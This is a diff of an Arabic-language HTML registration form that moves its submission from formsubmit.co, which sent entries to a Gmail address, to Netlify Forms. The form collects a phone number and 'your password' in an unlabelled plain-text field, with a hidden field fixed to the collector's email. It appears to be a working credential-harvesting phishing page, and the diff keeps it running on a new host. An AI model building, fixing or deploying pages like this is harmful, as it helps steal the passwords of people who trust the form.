@@ -2,21 +2,19 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>نموذج تسجيل البيانات - تصميم هاتف احترافي</title>
+  <title>نموذج تسجيل البيانات - Netlify Forms</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
-
     body {
       margin: 0;
       padding: 40px 20px;
-      background: #e6f2e6; /* خلفية خفيفة أخضر */
+      background: #e6f2e6;
       font-family: 'Cairo', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
     }
-
     form {
       background: white;
       width: 100%;
@@ -26,7 +24,6 @@
       box-shadow: 0 10px 30px rgba(0, 128, 0, 0.2);
       box-sizing: border-box;
     }
-
     h2 {
       text-align: center;
       margin-bottom: 25px;
@@ -34,7 +31,6 @@
       font-weight: 700;
       font-size: 1.8rem;
     }
-
     input[type="tel"],
     input[type="text"] {
       width: 100%;
@@ -47,14 +43,12 @@
       transition: border-color 0.3s ease;
       direction: rtl;
     }
-
     input[type="tel"]:focus,
     input[type="text"]:focus {
       border-color: #3a9d3a;
       outline: none;
       box-shadow: 0 0 8px #3a9d3a;
     }
-
     button {
       width: 100%;
       background-color: #2a662a;
@@ -68,15 +62,12 @@
       box-shadow: 0 6px 12px rgba(42, 102, 42, 0.5);
       transition: background-color 0.3s ease;
     }
-
     button:hover {
       background-color: #1e461e;
     }
-
     input[name="_honey"] {
       display: none;
     }
-
     @media (max-width: 360px) {
       form {
         padding: 25px 15px;
@@ -99,24 +90,23 @@
 </head>
 <body>
 
-  <form id="formBase64" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
-    
+  <form name="registration" method="POST" data-netlify="true" netlify>
     <h2>نموذج تسجيل البيانات</h2>
+
+    <!-- مهم: حقل إخفاء اسم النموذج -->
+    <input type="hidden" name="form-name" value="registration">
 
     <!-- رقم الهاتف -->
     <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
 
-    <!-- بريد إلكتروني مخفي وثابت -->
+    <!-- بريد إلكتروني مخفي -->
     <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">
 
-    <!-- كلمة المرور نص عادي بدون تسمية -->
+    <!-- كلمة مرور نص عادي -->
     <input type="text" name="كلمة_مرورك" placeholder="" required>
 
-    <!-- منع سبام -->
+    <!-- حقل سبام مخفي -->
     <input type="text" name="_honey">
-
-    <!-- إعادة التوجيه بعد الإرسال -->
-    <input type="hidden" name="_redirect" value="thanks.html">
 
     <button type="submit">إرسال</button>
   </form>
